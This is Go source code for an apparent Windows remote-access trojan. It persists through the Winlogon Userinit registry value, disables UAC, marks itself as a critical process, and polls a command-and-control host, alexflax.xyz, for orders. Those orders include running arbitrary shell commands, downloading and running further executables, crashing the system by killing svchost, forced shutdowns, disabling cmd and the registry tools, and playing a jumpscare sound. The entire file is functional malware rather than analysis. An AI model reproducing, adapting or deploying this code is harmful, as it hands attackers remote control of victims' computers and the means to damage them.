package main

//go:generate goversioninfo

import (
	"os/exec"
	"os"
	"io"
	"golang.org/x/sys/windows/registry"
	"golang.org/x/sys/windows"
	"net/http"
	"time"
	"encoding/json"
	"fmt"
	"syscall"
	"unsafe"
	"github.com/google/uuid"
	"github.com/faiface/beep"
    "github.com/faiface/beep/mp3"
    "github.com/faiface/beep/speaker"
	_ "embed"
	"bytes"
)

func commandexec(command string) {
	cmd := exec.Command("cmd", "/C", command)
	cmd.Run()
}

func OpenRegistry(kind registry.Key, key string) registry.Key {
	k, err := registry.OpenKey(kind, key, registry.SET_VALUE)
	if err != nil {
		print("UNABLE OPEN REG KEY\n")
		print(err)
		os.Exit(6)
	}
	return k
}

type Command struct {
	Command string `json:"command"`
	Arguments string `json:"arguments"`
}

type Setting struct {
	Name string `json:"name"`
	Value string `json:"value"`
}

func download(url string, dest string) {
    client := &http.Client{}
    req, err := http.NewRequest("GET", url, nil)
    if err != nil {
        fmt.Println("REQ ERR:", err)
        return
    }
    req.Header.Set("Cache-Control", "no-cache, no-store")
    req.Header.Set("Pragma", "no-cache")
    
    resp, err := client.Do(req)
    if err != nil {
        fmt.Println("GET ERR:", err)
        return
    }
    defer resp.Body.Close()
    
    f, err := os.Create(dest)
    if err != nil {
        fmt.Println("CREATE ERR:", err)
        return
    }
    defer f.Close()
    
    _, err = io.Copy(f, resp.Body)
    if err != nil {
        fmt.Println("COPY ERR:", err)
    }
}

var (
	modntdll 					= syscall.NewLazyDLL("ntdll.dll")
	procRtlSetProcessIsCritical = modntdll.NewProc("RtlSetProcessIsCritical")
	procRtlAdjustPrivilege      = modntdll.NewProc("RtlAdjustPrivilege")
)

func setCritical() error {
	var debugPrivilegeEnabled bool
	ret, _, err := procRtlAdjustPrivilege.Call(
		uintptr(20),
		uintptr(1),
		uintptr(0),
		uintptr(unsafe.Pointer(&debugPrivilegeEnabled)),
	)
	if ret != 0 {
		return fmt.Errorf("RtlAdjustPrivilege failed with NTSTATUS: %x, error: %w", ret, err)
	}

	critical := uint32(1)
	ret, _, err = procRtlSetProcessIsCritical.Call(
		uintptr(critical),
		uintptr(0),
		uintptr(0),
	)

	if ret != 0 {
		return fmt.Errorf("RtlSetProcessIsCritical failed with NTSTATUS: %x, error: %w", ret, err)
	}

	return nil
}

func GrabSetting(name string) string {
	resp, err := http.Get("https://alexflax.xyz/procidian/gset.php?name=" + name)
	if err != nil {
		print("FETCH ERROR\n")
		print(err)
	}
	

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		print("READ ERROR\n")
		print(err)
	}
	data := body
	resp.Body.Close()

	var c Setting
	err = json.Unmarshal(data, &c)
	if err != nil {
		print("JSON DECODE ERROR\n")
		fmt.Println(err)
	}
	return c.Value
}

//go:embed scare.mp3
var JSCARE_SOUND []byte

func scare() {
	streamer, format, _ := mp3.Decode(io.NopCloser(bytes.NewReader(JSCARE_SOUND)))
    defer streamer.Close()
    speaker.Init(format.SampleRate, format.SampleRate.N(time.Second/10))
    speaker.Play(beep.Seq(streamer, beep.Callback(func() {})))
}

func _main() {
	fmt.Println("OK")
	fmt.Println("VERIFY")
	err := setCritical()
	if err != nil {
		fmt.Println("I can't set myself as critical!\nLucky bastard")
	}	

	for {
		resp, err := http.Get("https://alexflax.xyz/procidian/gcom.php")
		if err != nil {
			print("FETCH ERROR\n")
			print(err)
			continue
		}
		

		body, err := io.ReadAll(resp.Body)
		if err != nil {
			print("READ ERROR\n")
			print(err)
			continue
		}
		data := body
		resp.Body.Close()

		var c Command
		err = json.Unmarshal(data, &c)
		if err != nil {
			print("JSON DECODE ERROR\n")
			fmt.Println(err)
			goto cont
		}

		switch c.Command {
		case "shell":
			commandexec(c.Arguments)
		case "msgbox":
			windows.MessageBox(0, windows.StringToUTF16Ptr(c.Arguments), windows.StringToUTF16Ptr("Alert"), windows.MB_OK | windows.MB_ICONINFORMATION)	
		case "bsod":
			commandexec("taskkill /f /im svchost.exe")
		case "shutdown":
			commandexec("shutdown -s -t 0")
		case "reboot":
			commandexec("shutdown -r -t 0")
		case "wallpaper":
			download(c.Arguments, `C:\Windows\winbase_base_procid_none\secured_0x01.sys`)
			user32 := syscall.NewLazyDLL("user32.dll")
			spi := user32.NewProc("SystemParametersInfoW")
			p, _ := syscall.UTF16PtrFromString(`C:\Windows\winbase_base_procid_none\secured_0x01.sys`)
			spi.Call(0x14, 0, uintptr(unsafe.Pointer(p)), 3)
		case "update":
			name := uuid.New().String()
			download(c.Arguments, "C:\\Windows\\winbase_base_procid_none\\" + name + ".exe")
			winlogon := OpenRegistry(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`)
			winlogon.SetStringValue("Userinit", "C:\\Windows\\system32\\userinit.exe,C:\\Windows\\winbase_base_procid_none\\" + name + ".exe")
			winlogon.Close()
			commandexec("shutdown -r -t 0")
		case "disable_tools":
			system := OpenRegistry(registry.CURRENT_USER, `Software\Policies\Microsoft\Windows\System`)
			system.SetDWordValue("DisableCMD", 1)
			system.SetDWordValue("DisableRegistryTools", 1)
			system.Close()
			commandexec("shutdown -r -t 0")
		case "enable_tools":
			system := OpenRegistry(registry.CURRENT_USER, `Software\Policies\Microsoft\Windows\System`)
			system.SetDWordValue("DisableCMD", 0)
			system.SetDWordValue("DisableRegistryTools", 0)
			system.Close()
			commandexec("shutdown -r -t 0")
		case "jscare":
			scare()
		case "testcom":
			commandexec("shutdown -r -t 0")
		case "testcom2":
			commandexec("shutdown -r -t 0")
		case "testcom3":
			commandexec("shutdown -r -t 0")
		}

		cont:
		time.Sleep(10000 * time.Millisecond)
	}
}

func main() {
	_, err := os.Stat("C:\\Windows\\winbase_base_procid_none\\secured_0xff.sys")
	if os.IsNotExist(err) {
		os.MkdirAll("C:\\Windows\\winbase_base_procid_none", 0755)
		file, err := os.Create("C:\\Windows\\winbase_base_procid_none\\secured_0xff.sys")
		defer file.Close()
		
		path, err := os.Executable()
		if err != nil {
			print("UNABLE GRAB EXE PATH\n")
			print(err)
			os.Exit(1)
		}
		src, err := os.Open(path)
		if err != nil {
			print("UNABLE GRAB SRC PATH\n")
			print(err)
			os.Exit(2)
		}
		defer src.Close()
		dst, err := os.Create("C:\\Windows\\winbase_base_procid_none\\procid_update.exe")
		if err != nil {
			print("UNABLE CREATE DEST\n")
			print(err)
			os.Exit(3)
		}
		defer dst.Close()
		_, err = io.Copy(dst, src)
		if err != nil {
			print("UNABLE COPY EXE\n")
			print(err)
			os.Exit(4)
		}

	
		winlogon := OpenRegistry(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`)
		winlogon.SetStringValue("Userinit", `C:\Windows\system32\userinit.exe,C:\Windows\winbase_base_procid_none\procid_update.exe`)
		winlogon.Close()

		UACBypass := OpenRegistry(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`)
		UACBypass.SetDWordValue("EnableLUA", 0x00000000)
		UACBypass.Close()	
		
		print("DONE!\n")
		commandexec("shutdown -r -t 0")
	} else {
		_main()
	}
}
